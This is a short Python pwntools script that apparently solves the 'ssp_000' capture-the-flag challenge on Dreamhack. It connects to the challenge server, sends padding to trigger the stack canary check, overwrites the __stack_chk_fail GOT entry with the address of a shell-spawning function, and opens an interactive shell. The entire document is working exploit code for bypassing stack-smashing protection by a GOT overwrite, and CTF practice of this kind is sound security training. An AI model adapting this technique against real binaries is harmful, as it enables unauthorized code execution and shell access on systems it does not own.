from pwn import *

# nc host1.dreamhack.games 18132

# p = process("./ssp_000")
p = remote("host1.dreamhack.games", 18132)

context.log_level = "debug"

get_shell_addr = 0x4008ea
fail_check_got = 0x601020

pay = b""
pay += b"A" * 0x50
p.send(pay)

p.recvuntil("Addr : ")
p.sendline(str(fail_check_got))
p.recvuntil("Value : ")
p.sendline(str(get_shell_addr))

p.interactive()